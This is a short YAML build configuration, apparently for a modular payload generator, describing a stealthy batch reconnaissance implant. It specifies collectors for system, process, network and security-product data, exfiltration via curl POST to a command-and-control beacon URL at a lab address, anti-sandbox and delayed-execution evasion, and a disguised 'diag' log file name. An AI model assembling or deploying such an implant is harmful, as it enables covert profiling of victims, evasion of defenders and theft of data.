name: bat_recon_stealth
description: Stealthy batch recon with sandbox checks and delayed execution
format: batch

core:
  - core/output

collectors:
  - collectors/sysinfo
  - collectors/processes
  - collectors/network
  - collectors/security_products

exfil: exfil/curl_post
arch: arch/sequential

evasion:
  - evasion/anti_sandbox
  - evasion/delayed_exec

vars:
  OUTPUT_FILE: "%TEMP%\\diag_%RANDOM%.log"
  C2_URL: "http://10.0.2.2:9001/beacon"
